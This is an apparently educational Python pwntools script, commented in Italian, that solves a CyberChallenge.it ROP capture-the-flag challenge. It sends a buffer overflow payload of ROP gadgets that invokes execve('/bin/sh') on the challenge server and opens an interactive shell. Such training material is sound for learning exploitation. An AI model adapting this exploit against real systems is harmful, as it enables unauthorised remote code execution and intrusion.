#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    HOST = "rop.challs.cyberchallenge.it"
    PORT = 9130
    r = remote(HOST, PORT)
    exe = ELF("./primality_test")
    context.binary = exe
    #r = process(exe.path)


    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"
    ret_addr_0 = p32(0x0804860c, endianness = 'little') # pop edx; ret;
    ret_addr_1 = p32(0x08048435, endianness = 'little') # pop ebx; ret;
    ret_addr_2 = p32(0x08048606, endianness = 'little') # pop eax; int 0x80;

    shell_string_addr = p32(0x08048991, endianness = 'little') # -> "/bin/sh"
    tmp = 11
    syscall_id = tmp.to_bytes(4, 'little')
    print(syscall_id)

    payload = b'a'*64 + b'b'*4 + b'c'*4 + ret_addr_0 + ret_addr_1 + ret_addr_2
    payload = b'a'*80 + ret_addr_1 + shell_string_addr + ret_addr_2 + syscall_id

    data = r.recvline()
    print(data)
    data = r.recvuntil("Enter a number: ")
    print(data)

    r.sendline(payload)

    data = r.recvline()
    print(data)

    r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
